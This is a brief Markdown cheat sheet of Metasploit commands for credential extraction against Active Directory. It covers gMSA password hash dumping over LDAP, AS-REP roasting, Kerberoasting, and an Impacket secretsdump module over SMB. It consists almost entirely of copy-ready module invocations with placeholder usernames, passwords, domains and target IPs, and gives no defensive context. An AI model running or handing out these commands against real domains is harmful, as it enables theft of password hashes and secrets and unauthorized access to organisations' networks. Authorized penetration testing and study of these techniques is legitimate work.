# Metasploit - Credential Extraction

### 1) Extract GMSA Password hashes

    use auxiliary/gather/ldap_query

Execution

    set LDAPUSERNAME user
    set LDAPPASSWORD password
    set ACTION ENUM_GMSA_HASHES
    run

### 2) AS-REP Roasting

    use auxiliary/gather/asrep

Execution

    set domain domain.local
    set rhosts IP
    set username ASREPROASTABLE_USER
    run

### 3) Kerberoasting

    use auxiliary/gather/get_user_spns

Execution

    set user user
    set pass password
    set domain domain.local
    set rhosts IP
    run

### 4) Secretsdump

    use auxiliary/scanner/smb/impacket/secretsdump

Execution

    set SMBUSER user
    set SMBPASS password
    set RHOSTS IP
    run

